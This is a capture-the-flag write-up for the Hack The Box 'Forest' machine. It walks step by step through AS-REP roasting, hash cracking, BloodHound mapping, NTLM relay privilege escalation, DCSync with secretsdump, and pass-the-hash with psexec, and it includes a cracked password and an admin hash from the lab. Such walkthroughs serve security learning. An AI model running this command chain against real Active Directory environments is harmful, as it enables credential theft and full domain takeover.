---
layout: default
---
## Forest
###### Retired March 2020
![](https://www.hackthebox.eu/storage/avatars/7dedecb452597150647e73c2dd6c24c7.png)

This is likely the most involved "Easy" Windows machine I've done so far. A sample list:
+ Kerberoasting
+ Bloodhounding
+ NTLM Relay
+ DCSync
+ Pass the Hash

Let's get started. As usual, nmap first

```bash
nmap -T4 -p- -A -oN nmap.results forest.htb
```

![](https://yaboygmoney.github.io/htb/images/forest/nmap.png)

Lots going on here. Notably SMB (445), Kerberos (88), LDAP/S (389/636), and WinRM (5985). I launch enum4linux to start pulling back information

```bash
enum4linux -a forest.htb
```

I was given a lot of information from this. First, we can see that the domain name is "HTB".

![](https://yaboygmoney.github.io/htb/images/forest/domainName.png)

In addition to that, I get a list of usernames (ones of particular interest are highlighted).

![](https://yaboygmoney.github.io/htb/images/forest/userList.png)

With the given usernames discovered, I put them into a wordlist by copying the output above into users.txt and then running

```bash
cat users.txt | awk -F ":" '{print $5}' | awk -F " " '{print $1}' > userlist.txt
```

The result is a cleaned up list

![](https://yaboygmoney.github.io/htb/images/forest/userlist2.png)

Then I started to try and ASREPRoast my userlist. [This article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) has been really beneficial in learning how Kerberos actually works and how to get it to help my activities. The syntax is as follows:

```bash
./GetNPUsers.py [The Domain Name]/ -usersfile [filename of your userlist] -no-pass -dc-ip [the IP address of the DC]
```

So for this situation, the command is

```bash
./GetNPUsers.py HTB/ -usersfile userlist.txt -no-pass -dc-ip forest.htb
```

![](https://yaboygmoney.github.io/htb/images/forest/roasted.png)

It was a bunch of nothing until the very last user: svc-alfresco.

Because Kerberos pre-authentication was disabled for this account, we are able to send an AS_REQ (request) for a ticket granting ticket on behalf of this user to the Key Distribution Center (the DC) and get the AS_REP (response) that has enough encrypted data for hashcat to get us the password.

I took the hash kicked out from kerberoasting and ran it through hashcat against the rockyou wordlist

```powershell
hashcat.exe -a -0 -m 18200 hash.txt rockyou.txt -O -o heresthepw.txt
type heresthepw.txt
```

![](https://yaboygmoney.github.io/htb/images/forest/hashcat.png)

![](https://yaboygmoney.github.io/htb/images/forest/cracked.png)

With a username and password in hand, I spun up [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and logged in

```bash
evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
```

User flag was hanging out on svc-alfresco's desktop

![](https://yaboygmoney.github.io/htb/images/forest/user.png)

Now it's time to find our way to administrator. The quickest way to do that in an AD environment is to unleash the hound. I downloaded the [SharpHound.ps1 ingestor](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) to my local machine and then utilized Evil-WinRM's upload feature to get it onto the machine.

```powershell
upload SharpHound.ps1
Import-Module ./SharpHound.ps1
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

A few seconds later I had a zip file containing information about the domain.

![](https://yaboygmoney.github.io/htb/images/forest/hounded.png)

Then just pull back the zip with Evil-WinRM's download utility

```powershell
download 20200320080006_BloodHound.zip
```

Now I need to get Bloodhound ready to ingest this data. Step 1 of that is to spin up neo4j. Step 2 is to spin up bloodhound's UI.

```bash
neo4j console
bloodhound
```

Then it's as easy as dragging and dropping your zip file into the bloodhound interface. After a few seconds, Bloodhound is ready to show us the way. I typically click on "Queries" and then select "Find Shortest Path to Domain Admins". The result is something like

![](https://yaboygmoney.github.io/htb/images/forest/path.png)

The path shows that from my current svc-alfresco account, I can use my membership of the group "Service Accounts". Every member of "Service Accounts" inherits permission of the "Privileged IT Accounts" group. Every member of the "Privileged IT Accounts Group" is also a member of "Account Operators". "Account Operators" enjoy all of the permissions associated with "Exchange Windows Permissions", which is essentially [all permissions](https://duo.com/decipher/microsoft-exchange-users-get-admin-rights-in-privilege-escalation-attack). 

> The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which means any member of the group can modify the domain privileges, such as the ability to perform DCSync, or synchronization operations by Domain Controllers. When authentication is relayed to LDAP, objects in the directory can be modified to grant higher levels of access, such as performing DCSync to replicate users’ hashed passwords in Active Directory. An attacker with those hashed passwords can impersonate any users on the network and authenticate to any service using NTLM or Kerberos authentication.

Spoiler alert: that's exactly what I'm about to do.

In a shared environment, it's best to create a new user, because we are going to promote that user and we don't want to spoil the learning environment by just making svc-alfresco all powerful right off the bat.

```powershell
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
New-ADUser ybgm -AccountPassword $pass -Enabled $True
```

I'm also going to add myself to the "Exchange Windows Permissions" group.

```powershell
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members ybgm
```

I also need to run [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the credentials and escalate my user to be in a position to fire off a DCSync.

```bash
./ntlmrelayx.py -t ldap://forest.htb --escalate-user ybgm
```

![](https://yaboygmoney.github.io/htb/images/forest/server.png)

This command spins up an HTTP server. Once I navigate to my localhost, the credentials will be requested and then relayed via LDAP to the DC.

![](https://yaboygmoney.github.io/htb/images/forest/relay.png)

Back on the terminal, we can see that the credentials are relayed via LDAP. Because I added my user 'ybgm' to the Exhange Windows Permissions group, the user has "Modifying domain ACL skills". By leveraging this, my user is given the replicate changes ability needed to perform a DCSync.

![](https://yaboygmoney.github.io/htb/images/forest/worked.png)

Now I can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to perform a DCSync and pull back hashes.

```bash
./secretsdump.py htb.local/ybgm:password@forest.htb -just-dc
```

![](https://yaboygmoney.github.io/htb/images/forest/secretsdump.png)

With the admin hash, I can use [PSExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) to get an administrative shell on the Domain Controller.

```bash
./psexec.py htb.local/administrator@forest.htb 'powershell.exe' -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

![](https://yaboygmoney.github.io/htb/images/forest/root.png)

I want to end with a shoutout to the user [SmoZy](https://www.hackthebox.eu/profile/134223) who helped me get past a syntax hurdle I had with Bloodhound that allowed me to push forward. The HTB community is awesome and be sure to help teach when you can!

#### Keep trying.
